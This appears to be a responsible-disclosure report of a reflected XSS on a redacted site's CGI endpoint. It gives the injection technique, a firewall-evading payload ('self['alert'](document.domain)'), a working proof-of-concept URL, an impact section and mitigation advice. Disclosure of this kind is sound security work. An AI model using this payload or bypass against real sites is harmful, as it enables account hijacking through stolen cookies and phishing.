# Reflected XSS on \[REDACTED]

## Summary:

The vulnerable parameter is `varset_site`, which reflects the inputted text directly into a `<script>` (JavaScript) tag. The snippet of code that it is inserted to is similar to the following:
```javascript
// https://[REDACTED]/SRVS/CGI-BIN/WEBCGI.EXE?New,Kb=igud_bashan,Company={8A245F94-C1FF-4E54-9373-F308EA45FF27},varset_site=injected_text
function func_name() {
  var_name = 'injected_text';
}
```
By using the sequence `'}`, I can escape the string and function entirely:
```javascript
// https://[REDACTED]/SRVS/CGI-BIN/WEBCGI.EXE?New,Kb=igud_bashan,Company={8A245F94-C1FF-4E54-9373-F308EA45FF27},varset_site=injected_text';}
function func_name() {
  var_name = 'injected_text'}';
}
```
Now that I am out of the function, I can execute arbitrary JavaScript code. The [REDACTED] Web Application Firewall tried to block my `alert(1)` function, but by playing around with JavaScript I managed to find a different way to execute `alert(1)`, like so:
```javascript
self['alert'](1)
```
I also escaped the rest of the `<script>` tag so that the browser would not complain about errors. Putting this all together, the payload is the following:
```html
text'}self['alert'](document.domain);</script>
```
The `test'}` escapes the JavaScript string and function, then the `self['alert'](document.domain);` executes my JavaScript code. Finally, the `</script>` escapes the script tag and therefore "comments out" any of the other code.

The final proof of concept [link](https://[REDACTED]/SRVS/CGI-BIN/WEBCGI.EXE?New,Kb=igud_bashan,Company=%7B8A245F94-C1FF-4E54-9373-F308EA45FF27%7D,varset_site=test%27%7Dself%5B%27alert%27%5D%28document.domain%29;%3C/script%3E):
```
https://[REDACTED]/SRVS/CGI-BIN/WEBCGI.EXE?New,Kb=igud_bashan,Company={8A245F94-C1FF-4E54-9373-F308EA45FF27},varset_site=test%27}self[%27alert%27](document.domain);%3C/script%3E
```

## Impact
Arbitrary JavaScript code execution. In my proof of concept, it prints the domain. However, an attacker could send `document.cookie` to himself in order to hijack accounts, or they could display a phishing page.

## Mitigation
Sanitize all parameters before using them (more information at the [OWASP page](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) regarding XSS prevention):
```
& --> &amp;
< --> &lt;
> --> &gt; 
" --> &quot;
' --> &#x27;
```
